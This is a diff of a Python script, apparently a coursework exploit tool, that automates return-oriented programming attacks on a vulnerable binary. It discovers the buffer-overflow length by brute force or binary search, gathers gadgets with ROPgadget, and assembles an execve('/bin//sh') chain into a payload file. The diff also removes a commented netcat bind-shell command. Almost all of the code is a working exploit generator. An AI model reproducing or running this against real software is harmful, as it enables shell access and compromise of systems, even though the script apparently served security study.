@@ -1,32 +1,55 @@
 import os
 import ROPcompile
+import ReverseExecution as RevExe
+import sys
 
 BINARY_BITS = 32
 
 BRUTE_FORCE = 0
 BINARY_SEARCH = 1
-ANALYSIS = 2
 
-#COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
 COMMAND = "execve(\"/bin//sh\")"
+SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11
 PROGRAM = "vuln3"
-FILE_MODE = True
+BUFFLENGTH = -1
 
-def main():
-    program = "./" + PROGRAM
-    if FILE_MODE:
-        program += " "
-    else:
-        program += " < "
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
 
-    #STEP 1 - Buffer Discovery
-    bufferLength = bufferDiscovery(BINARY_SEARCH, program)
-    print(bufferLength)
-    #STEP 2 - Create ROP Chain
-    ROPchain = createROPchain(COMMAND, bufferLength)
-    #STEP 3a - Verify success with known .data
+def main(args):
+    if len(args) < 3 or len(args) > 4:
+        print("Expected 2 or 3 arguments, got " + str(len(args)-1))
+        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation [Buffer Length]")
+        quit()
+    fileCheck(args[1])
+    fileCheck(args[2])
 
-    #STEP 3b - Verify success with random .data
+    global PROGRAM
+    PROGRAM = args[1]
+    program = "./" + PROGRAM + " "
+
+    global SHELLCODE
+    SHELLCODE = []
+    shellfile = open(args[2], "r")
+    for line in shellfile:
+        if(line[0:2] == "b'" and line[-2] == "'"):
+            SHELLCODE.append(eval(str(line).rstrip('\n')))
+        else:
+            SHELLCODE.append(str(line).rstrip('\n'))
+
+    global BUFFLENGTH
+    if len(args) == 4:
+        BUFFLENGTH = int(args[3])
+
+    if BUFFLENGTH == -1:
+        BUFFLENGTH = bufferDiscovery(BINARY_SEARCH, program)
+
+    ROPchain = makeROPchain(SHELLCODE, BUFFLENGTH)
 
 def bufferDiscovery(mode, program):
     global BINARY_BITS
@@ -40,10 +63,6 @@ def bufferDiscovery(mode, program):
             print("Binary Search")
             return binarySearch32(program)
         
-        if(mode == ANALYSIS):
-            #Do Something
-            print("Analysis")
-        
 
     if BINARY_BITS == 64:
         if(mode == BRUTE_FORCE):
@@ -53,10 +72,6 @@ def bufferDiscovery(mode, program):
         if(mode == BINARY_SEARCH):
             print("Binary Search")
             return binarySearch64(program)
-        
-        if(mode == ANALYSIS):
-            #Do Something
-            print("Analysis")
         
 
 def bruteForce32(program):
@@ -132,22 +147,33 @@ def run(program, payload):
     command = program + payload
     return os.system(command)
 
-def createROPchain(command, bufflength):
+def makeROPchain(shellcode, bufflength):
 
     #Find ROP gadgets
     os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
 
-    #Write command as gadgets
-    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt", BINARY_BITS)
-
-    #Verify gadgets are present
-
-    #Rewrite for missing gadgets
+    #Write Shellcode as gadgets
+    dictionary = {}
+    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
+    gadgets = dictionary.keys()
+    payload = RevExe.create(shellcode, gadgets)
+    bpayload = ROPcompile.AssemblyListToGadgets(payload, bufflength, dictionary)
+    print()
+    print("Payload:")
+    print(bpayload)
 
     #Write the payload
     pfile = open("payload", "bw")
-    pfile.write(payload)
+    pfile.write(bpayload)
 
+
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
 
 if __name__ == "__main__":
-    main()
+    main(sys.argv)
